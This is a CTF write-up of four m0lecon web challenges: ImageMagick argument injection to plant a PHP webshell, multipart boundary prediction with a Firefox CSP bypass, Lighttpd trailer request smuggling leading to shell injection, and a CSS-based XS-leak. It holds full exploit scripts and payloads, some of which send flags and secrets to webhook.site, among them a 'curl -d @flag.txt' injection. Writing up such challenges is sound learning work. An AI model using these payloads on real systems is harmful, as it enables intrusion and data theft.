m0lecon, the 100 weight CTF has wrapped up. It had some very interesting web challenges. I managed to solve 3/4, and almost solved 4th before the time ran out.

## Magik

This wasn’t really web to be honest, and that was a bit disappointing.

A php server was deployed, and we could upload images which would then be passed to magik and saved -

`convert $1 -resize 64x64 -background none -gravity center -extent 64x64 $2`

$2 was the just `'static/'.$_POST['name'].'.png'`. So we could control its value.

Now bash doesn’t parse special symbols like `${}` or `;` when replacing variables in commands. But, it splits at space. So if you do convert $2, and $2="a b", then convert will be passed a and b as separate arguments. With this expansion, we could practically use any argument available in convert command.

One such interesting option is `-write`. It basically instructs convert to dump raw pixel bytes to a file we specify. Since we control the uploaded image too, we can deliberately set its bytes to our payload and write it to pwned.php and then just execute it by sending HTTP request to /pwned.php.

Here is the payload image generator -

```py
from PIL import Image
import numpy as np
php = b"<?php passthru('/readflag'); ?>"
buf = bytearray(64*64)
buf[:len(php)] = php
arr = np.frombuffer(bytes(buf), dtype=np.uint8).reshape((64,64))
Image.fromarray(arr, mode='L').save('upload.png')
```

Then we upload it with filename —

`solution.png -write gray:/app/pwned.php x`

Specifying `gray:` is important to skip forming a proper png, and writing as raw pixels.

That’s it. This will write to pwned.php, and we just get the flag by going to /pwned.php.

SecureTextBin
-------------

This was one of my favorite challenges of the year. We could create notes, but the frontend won’t pass the content-type to backend, resulting in it defaulting to text/plain. This resulted in us having no HTML rendering, let alone JS.

```js
async function uploadFile(fileName, fileBuffer, fileId, BACKEND) {
    const fd = new FormData();
    const blob = new Blob([fileBuffer], { type: 'text/plain' });
    fd.append('file', blob, fileName);
    fd.append('id', fileId);
    return await fetch(BACKEND, { method: 'POST', body: fd });
}
```

The above function was responsible for sending the file to the backend. There didn’t seem to be any possibility of exploiting the filename to add a content_type field in the post request.

To understand this, we need to understand how multipart formdata works. The raw bytes aren’t encoded in any way, but a boundary is appended above and below the value contents like file blob.

Something like this -

```
--XXX
Content-Disposition: form-data; name="name"
John
--XXX
Content-Disposition: form-data; name="age"
12
--XXX--
```

In this, XXX is the boundary. It has to be specified in Content-Type header like `Content-Type: multipart/form-data; boundary=XXX`

Now as soon as browser sees `--{Boundary}`, it will start parsing it as FormData field. On next hit of `--{Boundary}`, it will end the current field, and start parsing next field, and goes on till it hits `--{Boundary}--`.

If the form field content contains the raw bytes — {Boundary}, it can close the current field being parsed, and inject its own fields. To prevent this, random suffix is added in the end of all boundary values by all sane HTTP handlers. But what if the underlying randomness isn’t cryptographically safe and can be predicted? Then an attacker can predict the boundary and inject its predicted boundary in the contents of whatever field it controls. This allows him to inject non existent fields in the request.

This is what we want. If we can somehow manage to send content_type field in request to backend, we can render HTML on our note. Quick search reveals that until recently, undici and form-data used Math.random() in nodejs, whose state is inherently shared across the process, and few leaks can allow us to predict next values.

The leak was given to us in the form of file_ids. The file IDs were generated using `const fileId = Math.floor(Math.random() * 1e12);` and returned to us. Piping few of these ids to [randcracks](https://github.com/Mistsuu/randcracks) allow us to predict next values, and hence the future Boundary suffix in undici.

This is an example file content to use this boundary prediction and insert arbitrary fields in form data.

```py
injection_for_backend = (
    f'{CRLF}--{backend_boundary}{CRLF}'  # End file part (at backend), start content_type part
    f'Content-Disposition: form-data; name="content_type"{CRLF}{CRLF}'
    f'text/html{CRLF}'  # End content_type value, start id part
    f'--{backend_boundary}{CRLF}'
    f'Content-Disposition: form-data; name="id"{CRLF}{CRLF}'
    f'133700000002{CRLF}'  # End id value, close multipart (injected)
    f'--{backend_boundary}--{CRLF}'
)
```

Great, now we get back text/html, but the CSP still is as default-src: None. So no javascript. We have to somehow make browser ignore that CSP directive. Then I remembered reading about a firefox only content-type directive which did something similar. Check it out [here](https://book.jorianwoltjer.com/web/client-side/crlf-header-injection#firefox-replace-csp).

Basically, setting content-type to multipart/x-mixed-replace, and specifying a boundary, browser will read headers from form body. So instead of uploading html as notes, we create a fake form body, with a preset boundary (remember we have total control over content-type, so we can set whatever boundary.)

This was my content of my final note body -

```html
html_payload = (
    f'--BOUNDARY{CRLF}'
    f'Content-Type: text/html{CRLF}'
    f"Content-Security-Policy: script-src-elem 'unsafe-inline';{CRLF}"
    f'{CRLF}'
    f'<script>window.location="http://webhook.site/?c="+localStorage.getItem("flag")</script>{CRLF}'
    f'--BOUNDARY--'
)
```

Here is a final script -

```py
import http.clientHOST = "127.0.0.1"
HOST = "f376975bb4af-securetextbin.challs.m0lecon.it"
PORT = 443
PATH = "/"
frontend_boundary = "----formdata-frontend-fixed-12345"
predicted_boundary = "45146613182"
backend_boundary =  f"----formdata-undici-0{predicted_boundary}"
CRLF = "\r\n"
html_payload = (
    f'--BOUNDARY{CRLF}'
    f'Content-Type: text/html{CRLF}'
    f"Content-Security-Policy: script-src-elem 'unsafe-inline';{CRLF}"
    f'{CRLF}'
    f'<script>window.location="http://webhook.site/?c="+localStorage.getItem("flag")</script>{CRLF}'
    f'--BOUNDARY--'
)
# File part header (using frontend_boundary)
file_part_header = (
    f'--{frontend_boundary}{CRLF}'
    f'Content-Disposition: form-data; name="file"; filename="p.txt"{CRLF}'
    f'Content-Type: text/plain{CRLF}{CRLF}'
)
# Injection for backend (using backend_boundary) - embedded after HTML
injection_for_backend = (
    f'{CRLF}--{backend_boundary}{CRLF}'  # End file part (at backend), start content_type part
    f'Content-Disposition: form-data; name="content_type"{CRLF}{CRLF}'
    f'multipart/x-mixed-replace; boundary=BOUNDARY{CRLF}'  # End content_type value, start id part
    f'--{backend_boundary}{CRLF}'
    f'Content-Disposition: form-data; name="id"{CRLF}{CRLF}'
    f'133700000002{CRLF}'  # End id value, close multipart (injected)
    f'--{backend_boundary}--{CRLF}'
)
# Full body: file header + HTML + backend injection + close frontend multipart
body = file_part_header + html_payload + injection_for_backend + f'{CRLF}--{frontend_boundary}--{CRLF}'
content_type_header = f'multipart/form-data; boundary={frontend_boundary}'
content_length = len(body)
conn = http.client.HTTPSConnection(HOST, PORT)
headers = {
    "Content-Type": content_type_header,
    "Content-Length": str(content_length),
}
conn.request("POST", PATH, body.encode('utf-8'), headers)
resp = conn.getresponse()
print(f"Status: {resp.status} {resp.reason}")
response_body = resp.read().decode('utf-8')
print(response_body)
conn.close()
```

Trailing Dangers
----------------

This took me a very long time, as I have never forced myself ever to learn CL.TE or TE.CL request smuggling. And this challenge made me do it to a good level.

Quick look will tell you Lighttpd proxy will block /debug, but to get RCE, you have to reach /debug on gunicorn server. Another quick look in Lighttpd library commits will tell you that our version had a security issue, allowing the injection of unsafe headers through Trailer.

Trailers basically let you specify headers after the body of the request. Lighttpd buffers the body and then parses the trailers and overwrites it directly. The bug was that due to a broken check, it allowed overwriting sensitive headers as well like Content-Length.

At first, I tried to set override content-length to 0, and send another request gunicorn as a classic CL.0 request smuggling. But the issue was, gunicorn received something like this -

```
<regular http stuff>
Content-Length: 0
Connection: close
POST /debug HTTP/1.1
....
```

Now the main issue was Connection: close. It basically instructs the receiver to close the connection and don’t read anything else as soon as this request is finished. So, it sees Content-Length set to 0, and reads 0 bytes of the body, and closes the connection. Our smuggled POST request got ignored. We can’t overwrite Connection header through trailer, because its set after trailer parsing in mod_proxy.

I then tried to perform a TE.TE desync attack, hoping to send transfer encoding as chunked to gunicorn too, and adding trailers to what gunicorn received, hoping I could do something like TE.TE.CL0. I wasted a good time on this dumb idea.

The problem was that Lighttpd will always inject Content-Length to the proxied request. We can use trailers to modify it to whatever we want, but we can’t remove it. And when gunicorn sees both CL + TE, it throws a 400 bad request, which is as per RFC xxx.

Finally, I pivoted towards analyzing the source code of mod_proxy in Lighttpd, specifically looking for a condition when Connection: close isn’t inserted. This lead me to this code -

```c
// ... logic to build the final request to the backend ...
if (connhdr && !hctx->conf.header.force_http10 && r->http_version >= HTTP_VERSION_1_1
    && !buffer_eq_icase_slen(connhdr, CONST_STR_LEN("close"))) {
    /* mod_proxy always sends Connection: close to backend */
    buffer_append_string_len(b, CONST_STR_LEN("\r\nConnection: close")); // Path A
    if (te)
        buffer_append_string_len(b, CONST_STR_LEN(", te"));
    if (upgrade) // <-- This is the key!
        buffer_append_string_len(b, CONST_STR_LEN(", upgrade"));
    buffer_append_string_len(b, CONST_STR_LEN("\r\n\r\n"));
}
else    /* mod_proxy always sends Connection: close to backend */
    buffer_append_string_len(b, CONST_STR_LEN("\r\nConnection: close\r\n\r\n")); // Path B
```

What happens here is that connection: close is always set, but if upgrade header is present, it will add `, upgrade` to Connection header.

So we just need to set Upgrade: Websocket header in headers, and then Lighttpd will write `Connection: close, upgrade` to gunicorn, which will cause it to not close the TCP connection and process the smuggled request.

Here is our base request structure which we send to Lighttpd -

```py
request = (
    "POST /t HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: Upgrade\r\n"
    "Trailer: Content-Length, Upgrade\r\n"
    "\r\n"
    f"{hex(len(smuggled_payload))[2:]}\r\n"  # Chunk size in hex without 0x
    f"{smuggled_payload}\r\n"                # Chunk data
    "0\r\n"
    "Content-Length: 0\r\n"
    "Upgrade: websocket\r\n"
    "\r\n"
)
```

This is the smuggled request -

```py
smuggled_payload = (
    f"POST /debug HTTP/1.1\r\n"
    f"Host: backend\r\n"
    f"Content-Type: application/json\r\n"
    f"Content-Length: {len(smuggled_body)}\r\n"
    f"\r\n"
    f"{smuggled_body}"
)
```

And now for the JSON body, we need a valid ipv6 address, which can cause shell injection as well. ipv6 supports % directive which allows to specify a “zone ID”. And this zone ID has a great range of allowed characters, so we can write out shell injection in it.

```
smuggled_body = f'{{"ip": "::1%;curl -d @flag.txt webhook.site"}}'
```

This is it. gunicorn parses the smuggled request to /debug, and causes command injection, giving us the flag.

Thoughts
--------

This one was very similar to corCTF’s web/paper, but due to time constraints, I wasn’t able to exfiltrate the flag before CTF ended.

The bot generates a cryptographically secure secret, stores it in redis and in the cookies of the frontend domain, and then visits the url we give. /flag endpoint fetches and deletes the secret and gives the flag if its correct. So we have a single chance to try the secret.

On frontend, if the user is logged in, a specific secret is displayed -

```js
return h.view('index', {
    title: 'Thoughts! Thoughts',
    thoughts: userThoughts.slice(0, 10),
    secret: request.state.secret || request.user.secret,
    customize: request.query.customize || ''
});
```

request.state is a method to access cookies of request. So the priority is given to secret explicitly specified in cookies, and if not, then the secret attached to the account is reflected. So even if the bot logs in to someone else’s account, it will still be reflected the secret cookie if set. That means, the bot will be reflected the what we need for the flag.

CSP allows us to run unsafe-inline CSS. So we can perform XS-Leak using CSS and window.length.

For those who are not familiar, if you do window.open() on a cross origin page, you can’t read most of the fields for obvious security reasons. But length field is available. This length field depicts the number of subframes the page has, including iframes, and <object> elements.

Now another interesting fact is that, even if you apply display:none to iframe, the page length will still include it, but if you apply the same style to object, it does not get counted in page’s length, and we can detect it from our own page. And— if you specify name attribute to object, you can access it as a key in window object from our own controlled page. Thus, we can leak stuff from any page’s contents if we have CSS+ HTML injection on that page.

Lets begin making our exploit. First, we need to make the bot login. We just create a form and submit it in new tab. Okay, now the [https://thoughts:3000](https://thoughts:3000/) page has 2 cookies, session and secret.

Next, we will create our leak directive -

We create 16 object elements with a names to reference hex chars -

```html
<object name="p-0" data="about:blank;"></object>
<object name="p-1" data="about:blank;"></object>
    ....
<object name="p-f" data="about:blank;"></object>
```

Now we set create css matchers that will hide only 1 object, based on character matched -

```html
<style>
body[secret^="${prefix}0"] object[name="p-0"] { display:none; }
body[secret^="${prefix}1"] object[name="p-1"] { display:none; }
</style>
```

Lets say the character after prefix is “b”. Then -

```js
let w = window.open("<url>?customize=<payload>")
let _x = w["p-a"]  //no error thrown
_x = w["p-b"]  //will throw error
```

Now coming onto final missing piece — the secret cookie is has `sameSite: "Strict"`. That means, if we do window.open(), the session secret will be reflected and not the secret cookie we want. A very quick bypass for that is refreshing the page. Our payload is in query only, and refresh will maintain our payload, but the new request after refresh will contain the cookie in the request, which will be reflected.

Here is the final HTML I hosted on webhook -

```html
<!DOCTYPE html>
<html>
<body>
<script>
const APP_URL = 'https://thoughts:3000';
async function login(){
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = APP_URL + "/login";
    form.target = '_blank'; // open in new tab
    
    const userField = document.createElement('input');
    userField.name = 'username';
    userField.value = 'xyx';
    form.appendChild(userField);
    
    const passField = document.createElement('input');
    passField.name = 'password';
    passField.value = 'xyxxyx';
    form.appendChild(passField);
    
    document.body.appendChild(form);
    form.submit();
    await new Promise(resolve => setTimeout(resolve, 500));
}
function object_gen(){
    let res = [];
    let hex_c = "0123456789abcdef"
    for (let i of hex_c){
        res.push(`<object name="p-${i}" data="about:blank;"></object>`)
    }
    return res.join("\n")
}
function css_gen(prefix){
    let res = ["<style>"];
    let hex_c = "0123456789abcdef"
    for (let i of hex_c){
        res.push(`body[secret^="${prefix}${i}"] object[name="p-${i}"] { display:none; }`)
    }
    res.push("</style>")
    return res.join("\n")
}
async function probe(w){
    //check which hex char mapped object has been applied display:none;
    let hex_c = "0123456789abcdef"
    for (let i of hex_c){
        try {
            let _x = w[`p-${i}`]
        }
        catch {
            return i
        }
    }
    return -1
}
async function leak() {
  await login()
  let obj_elm = object_gen()
  let leaked = ""
  for(let i = 0; i < 6; i++){
    let style_elm = css_gen(leaked) //create css using leaked chars as prefix
    const customizePayload = encodeURIComponent(obj_elm+style_elm+`<meta http-equiv=refresh content=1>`);
    const w = window.open(`${APP_URL}/?customize=${customizePayload}`, '_blank');
    //we wait now to let the page refresh, and probe before 2nd refresh hits.
    await new Promise(resolve => setTimeout(resolve, 1650));
    leaked += await probe(w)
  }
  console.log(leaked)
  fetch("https://webhook.site/?secret="+leaked)
}
leak();
</script>
</body>
</html>
```